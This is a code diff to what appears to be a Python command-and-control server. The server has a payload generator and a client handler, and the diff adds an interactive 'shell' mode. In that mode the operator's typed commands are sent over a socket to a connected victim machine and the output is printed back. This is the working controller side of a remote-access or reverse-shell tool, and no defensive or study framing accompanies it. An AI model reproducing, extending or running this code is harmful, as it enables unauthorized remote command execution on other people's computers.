@@ -237,6 +237,22 @@ class Commands():
             # Iterate and Show User the Response
             for key, val in zip(keys, values):
                 print(f"{Fore.BLUE}{key}:{Style.RESET_ALL} {val}")
+    
+    class Shell():
+        def __init__(self) -> None:
+            pass
+
+        def run(self, command: str) -> str:
+            """
+            Returns the command, used for organization
+
+            Args:
+                command (str): The command
+
+            Returns:
+                str: The command
+            """
+            return command
 
 
 class CommandCenter(Commands):
@@ -275,6 +291,21 @@ class CommandCenter(Commands):
                     self.cli = ">> "
                     logging.info("Exitted Session")
                     print("Exitted Session")
+                elif command == 'shell':
+                    try:
+                        self.conn.send(str.encode('shell'))
+                        while True:
+                            command = input("$ ")
+                            print(command)
+                            if command == 'exit':
+                                self.conn.send(str.encode(command))
+                                break
+                            if command != "":
+                                data = self.Shell().run(command)
+                                self.conn.send(str.encode(data))
+                                print(self.conn.recv(20480).decode())
+                    except BrokenPipeError:
+                        print("Connection Disrupted")
                 else:
                     try:
                         self.conn.send(str.encode(command))
@@ -411,7 +442,7 @@ def main():
     serverAddr, serverPort, socket = server.start(parser)
 
     # ===== Payload Creator ===== #
-    generator = PayloadGenerator(serverPort, serverAddr, parser)
+    PayloadGenerator(serverPort, serverAddr, parser)
 
     # ===== Start the Client Handler ===== #
     handler = ClientHandler(socket)
